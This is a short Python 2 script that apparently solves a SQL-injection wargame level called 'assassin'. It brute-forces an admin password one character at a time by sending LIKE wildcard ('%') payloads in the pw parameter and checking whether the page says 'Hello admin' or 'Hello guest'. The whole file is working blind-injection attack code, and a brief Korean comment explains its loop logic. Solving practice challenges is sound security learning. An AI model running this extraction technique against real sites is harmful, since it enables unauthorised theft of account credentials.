#-*- coding: utf-8 -*-
import string
from web import *

url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw={}"
# get password : brute forcing : for admin

password=""
tmp_key = ""

for i in range(1,9):
    for c in string.digits + string.letters:
        req = getRequest(url, password+c+"%", show=False)
        page = getPage(req)
        if "Hello admin" in page:
            print "Find Admin",i,c
            password += c
            break
        if "Hello guest" in page:
            print "Find Guest",i,c
            tmp_key = c
    else: password += tmp_key # break 가 아닌 정상종료시에만 작동

    print "Check[{}] password = {}".format(i, password)
    print "-"*20

print "Password :",password
